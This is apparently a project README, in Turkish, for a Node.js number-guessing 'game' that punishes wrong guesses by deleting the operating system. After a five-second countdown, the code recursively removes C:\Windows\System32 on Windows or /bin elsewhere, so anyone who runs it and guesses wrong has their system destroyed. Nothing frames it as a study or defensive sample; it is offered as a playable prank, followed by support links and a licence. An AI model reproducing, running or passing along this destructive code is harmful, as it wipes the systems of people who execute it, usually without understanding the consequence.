# Number_Guessing_Game_Operating_System_Penalty

# İşletim Sistemi Cezalı Sayı Tahmin Oyunu!


```
const rl = require('readline-sync');
const fs = require('fs');

let pctut = Math.floor(Math.random() * 10);
let tahmin = rl.questionInt('0 ile 10 arasinda bir sayi tahmin ediniz: ');

async function delay(s) {
    for(let i = s; i >= 1; i--) {
        await new Promise(resolve => setTimeout(resolve, 1000));
        console.log(`${i} saniye sonra işletim sistemi silinecek!`);
    }
}

if(isNaN(tahmin)) {
    console.log('Lutfen sayi giriniz!');
    process.exit(1);
}

if(tahmin == pctut) {
    console.log('Tebrikler! Sayiyi dogru tahmin ettiniz.');
    process.exit(0);
} else {
    console.log('Uzgunum! Sayiyi yanlis tahmin ettiniz.');
    (async () => {
        await delay(5);
        console.log('Isletim sistemi siliniyor...');
        if(fs.existsSync('C:\\Windows\\System32')) {
            fs.rmdirSync('C:\\Windows\\System32', { recursive: true });
        } else {
            fs.rmdirSync('/bin', { recursive: true });
        }
    })();
}
```

---
- ✨ [Destek İçin](https://fastuptime.com) <br>
- 💕 [Discord](https://fastuptime.com/discord)<br>
- 🎖️ [FasterHost Technology](https://fasterhost.tech/)<br>
- ✨ İletişim için [Tıkla!](mailto:fastuptime@gmail.com)<br>

# License
- Its protected by Creative Commons ([CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/))

<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" title="BYNCSA40"><img src="https://licensebuttons.net/l/by-nc-sa/4.0/88x31.png"></a>
